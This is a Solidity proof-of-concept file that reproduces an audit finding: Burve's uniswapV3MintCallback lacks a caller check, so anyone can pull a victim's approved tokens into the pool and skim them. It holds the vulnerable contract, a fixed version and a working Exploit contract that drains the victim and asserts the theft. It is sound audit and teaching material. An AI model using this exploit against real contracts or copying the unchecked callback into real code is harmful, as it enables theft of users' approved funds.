// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Burve — unrestricted uniswapV3MintCallback drains approved tokens
    (Pashov Audit Group, C-04, finding 55211, review 2025-01-29).

    SYNTHETIC, cheatcode-free. The callback decodes an arbitrary source and
    pulls both tokens into the pool. There is no msg.sender == pool check.
    The payment is not tied to a minted position, so the attacker withdraws
    the pool balance and ends holding the victim's tokens. The control
    reverts unless the caller is the pool, and the victim keeps both balances. */

library TransferHelper {
    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        require(Token(token).transferFrom(from, to, value), "TRANSFER_FROM_FAILED");
    }
}

contract Token {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Pool {
    Token public immutable token0;
    Token public immutable token1;

    constructor(Token _token0, Token _token1) {
        token0 = _token0;
        token1 = _token1;
    }

    // The callback payment is not locked in a position. The caller can take it.
    function skim(address to) external {
        uint256 amount0 = token0.balanceOf(address(this));
        uint256 amount1 = token1.balanceOf(address(this));
        if (amount0 != 0) token0.transfer(to, amount0);
        if (amount1 != 0) token1.transfer(to, amount1);
    }
}

contract Burve {
    address public token0;
    address public token1;
    Pool public pool;

    constructor(address _token0, address _token1, Pool _pool) {
        token0 = _token0;
        token1 = _token1;
        pool = _pool;
    }

    function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata data) external {
        address source = abi.decode(data, (address));
        // @> VULN: no check that msg.sender is the pool, so any caller pulls `source`'s approved tokens
        TransferHelper.safeTransferFrom(token0, source, address(pool), amount0Owed);
        TransferHelper.safeTransferFrom(token1, source, address(pool), amount1Owed);
    }
}

contract BurveFixed {
    address public token0;
    address public token1;
    Pool public pool;

    constructor(address _token0, address _token1, Pool _pool) {
        token0 = _token0;
        token1 = _token1;
        pool = _pool;
    }

    error NotPool();

    function uniswapV3MintCallback(uint256 amount0Owed, uint256 amount1Owed, bytes calldata data) external {
        if (msg.sender != address(pool)) revert NotPool();
        address source = abi.decode(data, (address));
        TransferHelper.safeTransferFrom(token0, source, address(pool), amount0Owed);
        TransferHelper.safeTransferFrom(token1, source, address(pool), amount1Owed);
    }
}

contract Victim {
    function approve(Token token0, Token token1, address burve) external {
        token0.approve(burve, type(uint256).max);
        token1.approve(burve, type(uint256).max);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant AMOUNT0 = 1000 ether;
    uint256 public constant AMOUNT1 = 250 ether;

    Token public token0;
    Token public token1;
    Pool public pool;
    Burve public burve;
    Victim public victim;

    uint256 public attacker0;
    uint256 public attacker1;
    uint256 public victim0;
    uint256 public victim1;

    constructor() {
        token0 = new Token("Token0", "TK0");
        token1 = new Token("Token1", "TK1");
        pool = new Pool(token0, token1);
        burve = new Burve(address(token0), address(token1), pool);
        victim = new Victim();
    }

    function run() external {
        this.fundVictim();
        this.approveBurve();
        this.pull();
        this.take();
        this.readBalances();
        this.assertHarm();
    }

    function fundVictim() external {
        token0.mint(address(victim), AMOUNT0);
        token1.mint(address(victim), AMOUNT1);
    }

    function approveBurve() external {
        victim.approve(token0, token1, address(burve));
    }

    function pull() external {
        burve.uniswapV3MintCallback(AMOUNT0, AMOUNT1, abi.encode(address(victim)));
    }

    function take() external {
        pool.skim(ATTACKER);
    }

    function readBalances() external {
        attacker0 = token0.balanceOf(ATTACKER);
        attacker1 = token1.balanceOf(ATTACKER);
        victim0 = token0.balanceOf(address(victim));
        victim1 = token1.balanceOf(address(victim));
    }

    function assertHarm() external {
        require(attacker0 == AMOUNT0, "attacker missing token0");
        require(attacker1 == AMOUNT1, "attacker missing token1");
        require(victim0 == 0 && victim1 == 0, "victim not drained");
        require(token0.balanceOf(address(pool)) == 0, "token0 left in pool");
        require(token1.balanceOf(address(pool)) == 0, "token1 left in pool");
    }
}
